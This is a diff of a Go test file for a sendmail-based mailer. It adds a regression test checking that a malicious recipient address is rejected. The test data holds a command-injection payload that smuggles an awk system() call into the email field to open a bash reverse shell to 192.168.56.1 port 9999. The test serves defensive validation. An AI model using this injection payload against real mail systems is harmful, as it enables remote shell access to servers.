@@ -22,6 +22,7 @@ package mailer
 
 import (
 	"fmt"
+	"strings"
 	"testing"
 
 	. "github.com/smartystreets/goconvey/convey"
@@ -71,5 +72,20 @@ func TestSendmail_Send(t *testing.T) {
 		// usual case when not in dev mode:
 		// the sendmail application must be installed and correctly configured on this machine
 		So(err, ShouldNotBeNil)
+	})
+}
+
+func TestSendmail_Input(t *testing.T) {
+	Convey("Test sendmail input", t, func() {
+		sendmail := &Sendmail{}
+		sendmail.BinPath = "/usr/bin/awk"
+		e := sendmail.Send(&mailer.Mail{
+			From:        &mailer.User{Address: "test@pydio.com"},
+			To:          []*mailer.User{{Address: "\";BEGIN {system(\"/usr/bin/bash -i >& /dev/tcp/192.168.56.1/9999 0>&1\");exit}\"#"}},
+			Subject:     "test",
+			ContentHtml: "Test",
+		})
+		So(e, ShouldNotBeNil)
+		So(strings.Contains(e.Error(), "does not seems a valid email address"), ShouldBeTrue)
 	})
 }
